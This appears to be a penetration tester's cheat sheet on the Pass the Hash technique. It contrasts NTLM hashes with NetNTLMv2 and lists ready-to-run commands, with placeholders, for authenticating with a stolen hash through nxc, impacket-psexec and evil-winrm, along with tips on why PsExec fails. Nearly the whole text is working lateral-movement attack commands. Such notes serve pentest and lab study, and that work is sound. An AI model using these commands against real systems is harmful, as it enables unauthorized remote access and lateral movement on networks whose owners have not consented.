Pass the Hash (PtH)

Important:

NTLM Hash: 32 hex characters. Looks like MD5. Collected by dumping hashes.

NetNTLMv2: looks like this user::DOMAIN::challenge:hmac:blob. Collected with responder.

NetNTLMv2 can be cracked, but not passed. NTLM Hash can be cracked and passed.

Check​

nxc smb <target> -u 's.holmes' -H <ntlm_hash> --local-auth

PsExec​

If fails, firewall blocking 445, account doesn't have local admin or SMB signing is enfoced.

impacket-psexec -hashes :<hash> 'baskerville'@<target>

Evil-WinRM​

Lower noise and privs require than PsExec.

evil-winrm -i <target> -u 'john.watson' -H <ntlm_hash>
